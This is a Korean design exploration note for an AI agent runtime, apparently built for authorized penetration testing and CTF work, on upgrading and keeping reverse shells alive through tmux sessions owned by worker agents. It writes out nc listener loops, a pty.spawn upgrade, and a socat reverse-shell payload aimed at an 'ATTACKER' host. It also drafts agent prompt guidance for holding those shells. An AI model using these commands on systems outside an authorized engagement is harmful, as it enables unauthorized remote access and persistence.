# 대화형 쉘·PTY·리버스쉘 유지 설계 아이디어

> **결론(2026-09-01):** 이 탐색은 **ADR-0003**으로 수렴했다. 채택된 모델은 "세션 소유
> worker + 형제 RPC 중계"가 아니라 **공용 책상(shared named session)** — 여러 에이전트가
> 한 tmux 세션에 직접 붙어 쓰되 한 번에 한 명만 타이핑하고 조종간을 팻말처럼 넘긴다.
> 화면은 각자 직접 읽고(4 KiB 메시지 경계 유실 회피), run 종료 시 세션은 자동 정리된다.
> 또한 약한 모델을 위해 원리 수준의 공격 방법론 카드를 디스크(`skills/`)에 실어 자율
> 참조하게 한다. 규범 결정과 미구현 증분은 `docs/adr/ADR-0003-*.md`가 소유한다. 아래
> 본문은 그 결정에 이른 탐색 기록으로 보존한다.

본 문서는 규범(ADR)이 아니라 **설계 탐색 노트**다. ADR-0003(쉘 실행 모델과 대화형
터미널 프리미티브)이 "Proposed"로 남긴 핵심 고민 — *덤프쉘 업그레이드, 리버스쉘
유지, PTY 관리를 코어를 키우지 않고 어떻게 하는가* — 를 더 깊이 파고, 이 런타임만의
특징인 **에이전트 간 실시간 통신**을 축으로 구체적 레시피와 선택지를 정리한다.
채택되는 결정은 ADR-0003 본문으로 승격한다.

---

## 0. 한 줄 결론

**PTY를 코어에 넣지 말고, "세션을 소유한 worker 에이전트"에게 넘긴다.** 대화형
세션(tmux pane)은 한 worker가 소유하는 장기 자원이고, 나머지 팀은 이미 있는 실시간
메시지 경로로 그 worker에게 "실행/캡처"를 요청한다. 즉 **PTY = 인프라**가 아니라
**PTY = 에이전트가 소유한 액터**로 재정의한다. 코어 변경은 ADR-0003 §3.1의 `stdin`
프리미티브 한 줄이면 충분하고, 나머지는 전부 OS 도구(tmux)와 doctrine이다.

---

## 1. 문제의 본질: 덤프쉘은 왜 "덤프"인가

`nc`로 받은 리버스쉘이 불편한 이유는 하나다 — **제어 tty(controlling terminal)가
없다.** tty가 없으면:

- job control 없음 → `Ctrl-Z`/`fg`/`bg` 불가, `Ctrl-C`가 쉘 자체를 죽임
- line-buffered/echo 제어 불가 → 화살표·탭 완성·히스토리 없음
- `sudo`, `su`, `ssh`가 "must be run from a terminal"로 거부됨
- `vim`, `less`, `top`, `gdb` 같은 full-screen(curses) 프로그램이 깨짐
- 프롬프트가 안 보이고 출력이 뭉침

전통적 "full TTY 업그레이드" 절차는 이 tty를 사후에 붙이는 과정이다:

```bash
# 1) 원격(피해 호스트)에서 pty를 스폰
python3 -c 'import pty; pty.spawn("/bin/bash")'   # 또는: script -qc /bin/bash /dev/null
# 2) 로컬(공격 호스트)에서 쉘을 백그라운드로
Ctrl-Z
# 3) 로컬 터미널을 raw+no-echo로 바꾸고 다시 포그라운드
stty raw -echo; fg
# 4) 원격에서 터미널 종류/크기 정합
export TERM=xterm-256color; stty rows 50 cols 200
```

3번(`stty raw -echo`)이 문제의 핵심이다. **로컬의 `nc`에는 pty가 없어서, 로컬
터미널을 직접 raw 모드로 돌려 원격 pty와 짝을 맞춰야** 한다. 이 단계는:

- 사람이 대화형 터미널을 쥐고 있다는 전제 위에서만 동작한다,
- `Ctrl-Z` → `stty` → `fg`라는 순차 job-control 조작을 요구한다,
- LLM처럼 **이산 턴(turn)으로 도구를 호출하는** 주체에게는 표현하기 어렵다.

이것이 ADR-0003 §2.2의 질문("프레임워크가 터미널 에뮬레이터를 다시 구현해야
하는가?")의 실체다. 답은 "아니오" — 대신 **로컬 쪽에 이미 pty가 있으면 3번이
통째로 사라진다.**

---

## 2. 핵심 통찰: 리스너를 tmux pane 안에서 돌리면 stty 춤이 사라진다

`stty raw -echo`가 필요한 유일한 이유는 **로컬 리스너가 "덤프 끝"이기 때문**이다.
리스너를 tmux pane 안에서 띄우면, **로컬 끝은 이미 실제 pty(=tmux pane)** 다. 그러면
로컬 raw 조작 없이 원격 pty만 붙이면 된다:

```bash
# 에이전트 컨테이너(Linux)에서: 리스너를 tmux pane 안에 띄운다 → 로컬 pty 확보
tmux new-session -d -s rev 'stty -echo; nc -lvnp 4444'

# 쉘이 붙은 뒤, 키 입력으로 원격에 pty를 스폰
tmux send-keys -t rev 'python3 -c "import pty;pty.spawn(\"/bin/bash\")"' Enter
tmux send-keys -t rev 'export TERM=xterm-256color; stty rows 50 cols 200' Enter

# 화면을 깨끗한 텍스트로 읽는다 (LLM의 "관찰")
tmux capture-pane -p -t rev
```

`Ctrl-Z`/`stty raw`/`fg`의 3단계 순차 조작이 **전부 제거**된다. tmux pane이 로컬
pty 역할을 대신하기 때문이다. 결과적으로:

- **쓰기(write)** = `tmux send-keys` (한 번의 이산 도구 호출)
- **읽기(read)** = `tmux capture-pane -p` (한 번의 이산 도구 호출)
- job control·raw 모드·echo·창 크기 = **tmux가 처리**, 코어는 무관

이 매핑이 LLM 턴 모델과 정확히 일치한다. tmux는 이 런타임이 재구현하기를 거부한
"가상 터미널 에뮬레이터"를 **이미 검증된 형태로 제공하는 외부 프로세스**다.

> Windows 대상은? **리스너는 항상 에이전트 자신의 Linux 컨테이너에서 돈다**(이
> 프로젝트의 QA는 Docker-only, 런타임 base는 Linux). 대상 OS가 Windows여도 pty를
> 붙이는 쪽은 언제나 에이전트 컨테이너이므로 tmux는 항상 가용하다. ADR-0003 §2.1의
> "크로스플랫폼" 우려는 *리스너 호스트 = 에이전트 컨테이너*로 고정하면 대부분 해소된다.
> (에이전트가 Windows 호스트에서 직접 도는 예외 상황에서만 ConPTY/`winpty` 논의가
> 필요하고, 그때도 리버스쉘은 대개 Linux 대상이라 우선순위가 낮다.)

---

## 3. 재프레이밍: "세션 = 에이전트가 소유한 액터" (이 런타임의 특징 활용)

이 런타임의 차별점은 **에이전트끼리 실시간으로 직접 통신**한다는 것이다(ADR-0001 §6:
`main↔worker`, `worker↔worker`, `Insight`/`Final`은 main 자동 포함). 이 특징을
PTY 문제에 그대로 얹으면 별도 IPC 데몬이 통째로 불필요해진다.

```text
              team send (request)
 worker-A  ───────────────────────▶  worker-shell (세션 소유자)
 (익스플로잇)                          │  tmux new -s tgt ...
 worker-B  ───────────────────────▶  │  send-keys / capture-pane
 (후속 열거)                          │
              team send (insight)     ▼
 main     ◀───────────────────────  "쉘 안정화됨, uid=0, TERM=xterm"
```

- **한 대화형 세션 = 한 named tmux 세션 = 한 worker가 소유**한다. 소유권이 곧 격리다
  (ADR-0001 §4의 "전역 세션 오염 금지"를 자연히 만족 — 세션은 이름으로 분리되고 소유
  worker가 정리한다).
- 다른 worker는 pane을 직접 만지지 않고 **`team send`로 "이 명령 실행하고 결과 줘"를
  요청**한다. 소유 worker가 직렬화해 실행하고 캡처를 되돌려준다. 별도 UDS 소켓·
  JSON-RPC·클라이언트 라이브러리(ADR-0003 §4.1의 금지 항목)가 필요 없다 — **팀 메시지
  버스가 곧 세션 IPC**다.
- 쉘이 죽으면 소유 worker가 즉시 감지해 `Insight`로 "shell dropped, re-listening"을
  broadcast한다. main은 이 실시간 신호로 재전략을 짠다.
- 장기 리스너/스캔이 main 턴 루프를 막지 않는다(ADR-0003 §3.3, ADR-0001의 2-depth
  worker 격리와 정합).

즉 **"PTY 데몬"을 만드는 대신, worker 하나를 PTY 데몬으로 쓴다.** 데몬의 수명주기·
취소·정리는 이미 코어가 보장하는 agent 수명주기(recall, terminal, kill-on-drop)에
얹힌다.

---

## 4. 구체 레시피 (전부 일반 `shell` 도구 호출, 코어 변경 0)

### 4.1 리버스쉘 리스너 + 자동 업그레이드 + 자동 재대기

```bash
# 죽어도 다시 듣는 리스너를 pane에 상주 (persistence)
tmux new-session -d -s rev 'while true; do stty -echo; nc -lvnp 4444; echo "[*] dropped, relistening"; sleep 1; done'

# (쉘 접속 후) 원격 pty 스폰 + 터미널 정합
tmux send-keys -t rev 'python3 -c "import pty;pty.spawn(\"/bin/bash\")" || script -qc /bin/bash /dev/null' Enter
tmux send-keys -t rev 'export TERM=xterm-256color; stty rows 50 cols 200' Enter

# 관찰
tmux capture-pane -p -t rev | tail -n 40
```

`socat`이 대상에 있으면 한 방에 완전한 pty를 넘길 수 있어 업그레이드 단계가 짧아진다:

```bash
# 리스너(에이전트 측, pane 안)
tmux new -d -s rev 'socat file:$(tty),raw,echo=0 tcp-listen:4444'
# 대상 측 페이로드
# socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER:4444
```

### 4.2 증분 읽기: 매 턴 화면 전체를 다시 읽지 않기

`capture-pane`은 매번 전체 스크롤백을 준다 → 토큰 낭비 + 128 KiB 상한 압박
(ADR-0001 §12). `pipe-pane`으로 pane 출력을 파일에 흘려 **새로 늘어난 부분만** 읽는다:

```bash
tmux pipe-pane -t rev -o 'cat >> /work/rev.log'   # pane → 파일로 tee
# 이후 매 턴: 마지막으로 읽은 바이트 오프셋 이후만
tail -c +"$LAST_OFFSET" /work/rev.log
```

오프셋은 workspace 파일(`/work/.rev.offset`)에 두면 재시작에도 살아남고, journal에
원문이 보존되는 불변식과 충돌하지 않는다. 이것이 "코어에 링버퍼를 넣지 말라"
(ADR-0003 §4.3)를 지키면서 증분 읽기를 얻는 방법이다.

### 4.3 "출력이 멈췄나?" 판정을 코어가 아니라 doctrine으로

ADR-0003은 코어의 정규식 프롬프트/센티널 감지를 금지한다(§4.2). 하지만 판정 자체는
필요하다 → **모델의 턴 루프에서** 센티널을 쓴다(코어 코드가 아니라 명령 문자열로):

```bash
# 명령 뒤에 유니크 마커를 찍고, 캡처에 그 마커가 보이면 "완료"로 본다
tmux send-keys -t rev 'id; echo "__RDY_$RANDOM__"' Enter
# 다음 턴: capture-pane에서 __RDY_ 토큰을 확인 (모델이 판단)
```

또는 짧은 간격으로 두 번 캡처해 diff가 없으면 "정착(settled)"으로 간주한다. 센티널의
취약성(ADR-0003 §2.1의 실패 모드)은 **코어의 상태머신이 아니라 모델의 한 턴 판단**으로
옮겨져, 실패해도 다음 probe로 자연히 회복된다(CTF solve-loop doctrine과 정합).

### 4.4 비대화형으로 끝낼 수 있으면 대화형을 쓰지 않는다

가장 저렴한 길은 애초에 pty가 필요 없게 만드는 것이다(ADR-0003 §3.1의 `stdin`
프리미티브가 여기에 딱 맞는다):

```bash
sudo -S id            # 비밀번호를 stdin으로 (대화형 프롬프트 회피)
ssh -tt user@host 'id; whoami'   # -tt로 강제 pty 할당, 명령 인라인
printf 'A\nB\n' | ./vuln         # 사전 구성 질의응답 일괄 전송
python3 - <<'PY'                  # REPL 대신 인라인 스크립트 원샷
import socket; ...
PY
```

복잡한 프로토콜 핸드셰이크·바이너리 익스플로잇은 `pwntools`/`pexpect` 스크립트로
원샷 실행하고 workspace에 아티팩트로 남긴다(ADR-0003 §3.2, 재현성 확보). `pexpect`와
`pwntools`는 **스크립트 내부에서 pty를 할당**하므로, 대화형성이 코어가 아니라
스크립트에 캡슐화된다.

---

## 5. 선택지 비교

| 접근 | pty? | 상태 유지 | 코어 변경 | 강점 | 약점/적합 |
|---|---|---|---|---|---|
| 현재 one-shot `shell` | ✗ | 무(stateless) | 0 | 결정론·완전 격리 | 대화형·프롬프트 불가 |
| `shell` + `stdin` (ADR-0003 §3.1) | ✗ | 무 | ~5줄 | `sudo -S`·질의응답 일괄 | 지속 세션 아님, pty 아님 |
| **tmux 세션 (권장)** | ✓ | 유(named) | 0 | 완전 pty·업그레이드·캡처·증분·persistence | tmux 의존(base에 포함) |
| dtach / abduco | ✓ | 유 | 0 | tmux보다 경량·단일 목적 | `capture-pane` 없음 → 캡처는 `pipe`로 자작 |
| FIFO 파이프 | ✗ | 유(파일) | 0 | 순수 POSIX·무의존 | pty 아님 → sudo/upgrade/curses 불가 |
| pwntools / pexpect | ✓(스크립트 내) | 스크립트 수명 | 0 | 익스플로잇·핸드셰이크 완벽·재현성 | 상주 세션엔 부적합 |
| (기각) PTY 데몬+UDS | ✓ | 유 | 수천 줄 | — | ADR-0003 §2.1의 모든 실패 모드 |

**결론적 우선순위**: (1) 비대화형으로 끝낼 수 있으면 `stdin` 프리미티브, (2) 상주
대화형/업그레이드/리버스쉘은 **tmux 세션을 소유한 worker**, (3) 익스플로잇·프로토콜은
pwntools/pexpect 스크립트. dtach/abduco는 tmux가 부재한 극소 환경의 fallback,
FIFO는 pty가 불필요한 라인 프로토콜 fallback.

---

## 6. 코어에 실제로 넣을 것 vs doctrine으로 둘 것

**코어 (Rust, 최소):**

- ADR-0003 §3.1의 `shell.stdin` 옵션 필드 하나. 파이프 열고 쓰고 EOF. one-shot·
  stateless·결정론 불변식(ADR-0001 §12)을 그대로 보존. **이것 외에 PTY 관련 코어
  추가는 하지 않는다.**

**doctrine (prompt/`prompts/`):**

- `authorized-engagement.md`의 운영 경계에 이미 있는 "지속성 설치는 진행 전 확인"과
  정합하도록, 리버스쉘 유지/리스너 상주는 **교전 scope 내 필요 최소**로 한정한다.
- 새 프롬프트 조각(초안): `interactive-shell.md`
  - "대화형이 필요하면 tmux named 세션을 만들고 그 세션을 **네가 소유**하라. pane
    쓰기는 `send-keys`, 읽기는 `capture-pane -p`(또는 `pipe-pane`+`tail`로 증분)."
  - "리버스쉘 업그레이드는 리스너를 tmux pane 안에서 띄워 로컬 pty를 확보한 뒤
    원격 `pty.spawn`+`stty rows/cols`+`TERM`만 하면 된다. 로컬 `stty raw` 조작은
    불필요하다."
  - "출력 정착 판정은 유니크 마커 echo 또는 이중 캡처 diff로 하라. 같은 명령을
    바꾸지 않고 반복하지 말라(solve-loop와 동일)."
  - "세션을 다 쓰면 `tmux kill-session`으로 정리하라. worker가 terminal이 되면 소유
    세션도 함께 정리한다."
- `fan-out.md`/`worker-role.md`에 "세션 소유자(worker-shell) 패턴"을 한 문단 추가:
  대화형 대상 하나당 소유 worker 하나, 형제는 `team send`로 요청.

**base 이미지:** tmux(및 선택적으로 socat/dtach)를 런타임 base에 포함(이미 nmap·
python·chrome를 포함하는 것과 동일 선상; ADR-0001 §17). 없으면 `interactive-shell.md`
레시피가 성립하지 않으므로 이건 doctrine이 아니라 base 계약이다.

---

## 7. ADR 불변식과의 정합 (하지 않는 것 재확인)

- **별도 IPC 데몬 금지 (ADR-0003 §4.1):** 세션 IPC를 팀 메시지 버스로 대체 → 지킴.
- **코어 센티널/프롬프트 파싱 금지 (§4.2):** 마커/diff 판정을 모델 턴으로 이동 → 지킴.
- **코어 터미널 에뮬레이터 재구현 금지 (§4.3):** tmux/pipe-pane에 위임 → 지킴.
- **전역 세션 오염 금지 (§4.4):** named 세션 + 소유 worker 격리 → 지킴.
- **최소 코어 (ADR-0001 §3):** 코어 변경은 `stdin` 한 필드 → 지킴.
- **운영 경계 (ADR-0002 §3.1):** 지속성/리스너는 scope 내 최소, 필요 시 confirm-before.

---

## 8. 열린 질문 / 리스크

1. **캡처 상한과 full-screen 앱.** `vim`/`top` 같은 curses 출력을 `capture-pane`로
   읽으면 ANSI가 섞인 스냅샷이 온다. 128 KiB 상한(ADR-0001 §12) 안에서 `-p`(plain)로
   대개 충분하나, 대형 tui는 모델이 `q`로 빠져나오도록 doctrine에 명시 필요.
2. **동시성.** 소유 worker가 한 pane을 직렬화하면 안전하지만, 형제 요청이 몰리면
   지연이 쌓인다. 세션당 한 소유자·요청 직렬화를 doctrine으로 고정하고, 부하가 크면
   대상별로 세션/worker를 분리(fan-out).
3. **재시작 후 tmux 세션 생존.** tmux 서버는 에이전트 프로세스와 독립 → 런타임
   재시작해도 pane은 살아 있다. 다만 소유 worker의 "이 세션은 내 것" 매핑은 journal에
   남지 않으므로, 재개 시 `tmux ls`로 재발견하는 절차를 doctrine에 둔다(코어 상태
   저장은 하지 않는다).
4. **정리 누락.** worker가 비정상 종료하면 tmux 세션이 고아가 될 수 있다. run 종료
   시 `tmux kill-server` 정리를 헤드리스 종료 경로 doctrine에 추가 검토.
5. **컨테이너 격리와 outbound.** 리스너는 에이전트 컨테이너 포트를 연다 → 네트워크
   정책상 대상이 에이전트로 되돌아올 수 있어야 한다(리버스쉘 전제). bind shell/포트
   포워딩이 필요한 토폴로지는 별도 검토.

---

## 9. 다음 단계 (제안)

1. `interactive-shell.md` 프롬프트 조각 초안 작성 → 공통 doctrine 체인에 편입(ADR-0002
   §3.7의 `build_system` 조립 순서에 맞춰 `team-conduct.md` 앞 배치 검토).
2. base 이미지에 `tmux`(+`socat`) 추가, `dimage.ps1` 스모크에 `tmux -V` 확인 라인.
3. ADR-0003 §3에 "세션 = 소유 worker 액터" 패턴과 "리스너-in-tmux 업그레이드" 통찰을
   반영해 Proposed → Accepted 승격.
4. (선택) `shell.stdin` 프리미티브 구현(ADR-0003 §3.1) — tmux 경로와 독립적으로 즉시
   가치가 있음.

---

## 참고자료

- [Upgrading Simple Shells to Fully Interactive TTYs — ropnop blog](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)
- [Upgrade Simple Shells to Fully Interactive TTYs — 0xffsec Handbook](https://0xffsec.com/handbook/shells/full-tty/)
- [Upgrade a linux reverse shell to a fully usable TTY shell — Hacker's Rest](https://zweilosec.github.io/posts/upgrade-linux-shell/)
- [abduco — session detach/attach 도구](https://github.com/martanne/abduco)
- [Terminal session management and multiplexing (tmux/dtach/abduco 비교)](https://danmackinlay.name/notebook/terminal_session_management.html)
